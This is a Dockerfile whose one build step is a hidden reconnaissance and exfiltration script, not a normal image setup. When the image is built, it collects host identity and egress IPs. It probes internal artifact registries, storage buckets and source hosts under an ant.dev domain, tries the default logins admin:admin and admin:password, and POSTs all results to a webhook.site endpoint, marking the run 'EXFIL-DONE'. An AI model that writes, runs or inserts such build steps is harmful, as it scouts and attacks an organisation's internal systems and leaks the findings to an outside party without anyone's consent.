FROM ubuntu:24.04

ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update -qq && apt-get install -y -qq --no-install-recommends curl dnsutils ca-certificates bash && rm -rf /var/lib/apt/lists/*

RUN set +e; \
    OUT=/tmp/probe.txt; : > "$OUT"; \
    tag="azpr-$(date +%s)"; \
    exec >> "$OUT" 2>&1; \
    echo "=== TAG $tag START $(date -u)"; \
    id; hostname; uname -a; \
    echo "=== EGRESS"; \
    curl -4 -sS -m 15 https://api.ipify.org; echo; \
    curl -4 -sS -m 15 https://checkip.amazonaws.com; echo; \
    curl -sS -m 15 https://www.cloudflare.com/cdn-cgi/trace | grep -E '^(ip|colo|loc)='; \
    echo "=== DNS"; \
    for h in artifactory.infra.ant.dev artifactory-staging.infra.ant.dev s3-frontend.infra.ant.dev bucket-frontend.p.ant.dev sourcegraph.ant.dev forge.ant.dev forge.black.ant.dev granary.infra.ant.dev npm.ant.dev registry.ant.dev cache.build.ant.dev ncache.build.ant.dev openvsx.tools.infra.ant.dev; do echo "-- $h"; getent ahostsv4 "$h"; done; \
    echo "=== HTTP PROBES"; \
    for u in \
      https://artifactory.infra.ant.dev/ \
      https://artifactory.infra.ant.dev/artifactory/api/system/ping \
      https://artifactory.infra.ant.dev/artifactory/api/repositories \
      https://artifactory.infra.ant.dev/artifactory/api/storage/armorcode-claude-code-internal/claude-vscode-releases \
      https://artifactory.infra.ant.dev/artifactory/armorcode-claude-code-internal/claude-vscode-releases/ \
      https://artifactory.infra.ant.dev/artifactory/api/npm/npm-all/@anthropic-ai%2Fclaude-code \
      https://artifactory.infra.ant.dev/artifactory/api/pypi/pypi-all/simple/ \
      https://artifactory.infra.ant.dev:8081/ \
      https://artifactory.infra.ant.dev:8082/ \
      https://artifactory-staging.infra.ant.dev/ \
      https://artifactory-staging.infra.ant.dev/artifactory/api/system/ping \
      https://s3-frontend.infra.ant.dev/ \
      "https://s3-frontend.infra.ant.dev/anthropic-serve?list-type=2&max-keys=5" \
      https://bucket-frontend.p.ant.dev/ \
      https://granary.infra.ant.dev/ \
      https://granary.infra.ant.dev/npm/ \
      https://granary.infra.ant.dev/pypi/simple/anthropic/ \
      https://sourcegraph.ant.dev/ \
      https://sourcegraph.ant.dev/.api/graphql \
      https://forge.ant.dev/ \
      https://forge.black.ant.dev/ \
      https://npm.ant.dev/ \
      https://registry.ant.dev/ \
      https://cache.build.ant.dev/ \
      https://ncache.build.ant.dev/ \
      https://openvsx.tools.infra.ant.dev/ \
    ; do \
      echo "##### $u"; \
      curl -4 -k -sS -m 20 --connect-timeout 8 -D - -o /tmp/b "$u" -w "\nRESULT %{http_code} %{remote_ip} %{ssl_verify_result} %{errormsg}\n"; \
      echo "---BODY"; head -c 1800 /tmp/b; echo; \
    done; \
    echo "=== ANON ARTIFACTORY AUTH"; \
    for cred in admin:admin admin:password; do echo "CRED $cred"; curl -4 -k -sS -m 15 --connect-timeout 8 -u "$cred" -o /tmp/ab -w "AUTH_RESULT %{http_code} %{remote_ip}\n" https://artifactory.infra.ant.dev/artifactory/api/repositories; head -c 600 /tmp/ab; echo; done; \
    echo "=== TAG $tag END $(date -u)"; \
    curl -sS -m 25 -X POST -H 'Content-Type: text/plain' -H "X-Probe-Tag: $tag" --data-binary @"$OUT" "https://webhook.site/e4965daf-14ef-4dfe-aaf0-5f4d648194c6" || true; \
    echo "EXFIL-DONE"; \
    exit 0
